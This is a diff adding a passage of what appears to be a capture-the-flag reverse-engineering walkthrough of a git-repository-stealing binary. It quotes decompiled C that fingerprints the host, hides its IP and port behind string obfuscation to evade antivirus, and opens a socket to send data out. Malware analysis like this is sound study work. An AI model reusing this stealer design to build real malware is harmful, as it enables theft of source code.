@@ -132,4 +132,106 @@ void gitGrabber(void)
 }
 ```
 
+Looking through this we can get a pretty general idea of what is happening based on the varaible names (which we will assume are not missleading, but who knows).
+
+In these lines
+```C
+  git_libgit2_init();
+  __fd = qyvqmmhtjmlie();
+  if (((__fd != -1) && (iVar3 = ndldgaiugwdhv(), iVar3 == 0)) &&
+     (iVar3 = dxfivqvkpuunm(&ss), iVar3 == 0))
+```
+
+It seems as if some sort of file discriptor is opended and then several checks happen, if any of these checks fail then the program exits out early. This means we probably want these checks to succseed.
+
+Opening the qyvqmmhtjmlie function we see that it does the following
+
+```C
+  int iVar1;
+  char *__file;
+  int fd;
+  char *lockfile;
+  __file = tgexpgbgxulli(6);
+  iVar1 = open(__file,0xc1,0x1a4);
+  aotxxfxjjvuoy(6);
+  return iVar1;
+```
+
+and  ndldgaiugwdhv does:
+```C
+int iVar1;
+  char *pcVar2;
+  int result;
+  int rv;
+  char *gitpath;
+  char *pidof_git;
+  
+  pcVar2 = tgexpgbgxulli(7);
+  iVar1 = git_repository_open_ext(0,pcVar2,1,0);
+  aotxxfxjjvuoy(7);
+  if (iVar1 == 0) {
+    pcVar2 = tgexpgbgxulli(8);
+    iVar1 = system(pcVar2);
+    aotxxfxjjvuoy(8);
+    if (iVar1 == 0) {
+      iVar1 = -1;
+    }
+    else {
+      iVar1 = 0;
+    }
+  }
+  else {
+    iVar1 = -1;
+  }
+  return iVar1;
+```
+
+Also looking through dxfivqvkpuunm (which was way too long to include and is in a seperate file in this directory)
+
+We can guess by the nuber of refrences to git that this is where the git repo is looked at before being stollen. It also makes sense that if there is no git repo on the system, then it can't do anything and simply returns.
+
+Looking farther down in the program we see the following lines of code:
+
+```C
+    ip_00 = tgexpgbgxulli(0x13);
+    length = std::__cxx11::basic_string<char,std::char_traits<char>,std::allocator<char>>::length();
+    iVar3 = kvhlfowzlznog(ip_00,0x1a0a,pcVar4,length);
+    aotxxfxjjvuoy(0x13);
+```
+and after this section of code, the program seems to end, so we can assume that this is where the meat of the operation happens.
+
+However, before we go farther it seems that we have found where 2 of the flags are. In order to use a socket (which we know from before this code does) you need to have an IP address and a port number. We directly see an variable labeled IP here and next to it an hard coded integer. At this point, I opended the program in GDB with GEF installed and simply called tgexpgbgxulli(0x13) which gave me the ip address and converted the hex port to an integer. (I will go into detail later in the walkthrough how to open and run stuff in GDB.) Both of these flags were correct letting me know that I was on the correct path.
+
+Now lets take a look at the monstrosity that is kvhlfowzlznog. Since it has over 200 lines (many longer then a single line) I won't paste it here, but the full decompiled code is also in the git repo. 
+
+Let's first look at a reduced first chunk:
+```C
+int kvhlfowzlznog(char *ip,uint16_t port,char *output,size_t length)
+{
+  ...
+  ...
+  yridlcsrsfalm(&my_uuid,0x10);
+  ...
+  ...
+  username = getlogin();
+  if (username == (char *)0x0) {
+    username = tgexpgbgxulli(5);
+  }
+  version_00 = tgexpgbgxulli(0x11);
+  uname((utsname *)&ubuf);
+  gettimeofday((timeval *)&tv,(__timezone_ptr_t)0x0);
+  fingerprint(&fp,username,version_00,ubuf.sysname,tv.tv_sec);
+                    /* try { // try from 0015a6ea to 0015a6ee has its CatchHandler @ 0015ac64 */
+  fpToK(&session_key,username,version_00,tv.tv_sec);
+                    /* try { // try from 0015a6f4 to 0015a746 has its CatchHandler @ 0015ac50 */
+  aotxxfxjjvuoy(0x11);
+  aotxxfxjjvuoy(5);
+  sock_00 = biuuwoagwpgxf(ip,port);
+  if (-1 < sock_00) {
+  ...
+  ...
+```
+
+At this point if we haden't guessed what the port was the 2nd argument passsed to the function we could definatly do that now. We also have seen the tgex function called enugh times that we are able to guess what it's purpose is simply from a black box perspective. It seems to be hiding the configuration strings needed for this program. This makes sense because anti virus software can be given certian strings (like a known bad IP) that cause it to block a program from running. Rather then simply hard code those values in, they are encrypted (or encoded since the key is also in the code) to prevent easy detection.
+
 
